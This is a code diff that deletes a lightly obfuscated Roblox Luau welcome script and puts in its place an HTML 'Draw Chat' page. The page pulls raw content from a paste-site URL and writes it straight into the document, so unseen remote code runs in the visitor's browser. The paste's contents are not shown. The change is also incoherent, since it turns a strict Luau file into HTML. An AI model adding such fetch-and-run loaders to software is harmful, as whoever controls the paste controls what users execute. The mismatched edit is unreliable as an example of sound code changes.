@@ -1,2 +1,28 @@
---!strict
-local _a=game:GetService(string.char(80,108,97,121,101,114,115))local _b=string.char(87,101,108,99,111,109,101,32,116,111,32,116,104,101,32,103,97,109,101,44,32)local function _c(_d:Player)local _e:number=100 print(`{_b}{_d.Name}! You start with {_e} coins.`)end _a.PlayerAdded:Connect(_c)
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Draw Chat</title>
+</head>
+<body>
+<div id="status">Memuat Draw Chat...</div>
+<script>
+fetch("https://pastefy.app/LPVi8vmk/raw")
+.then(response => {
+  if (!response.ok) throw new Error("Gagal mengambil kode");
+  return response.text();
+})
+.then(html => {
+  document.open();
+  document.write(html);
+  document.close();
+})
+.catch(error => {
+  document.getElementById("status").textContent =
+    "Gagal memuat Draw Chat: " + error.message;
+});
+</script>
+</body>
+</html>
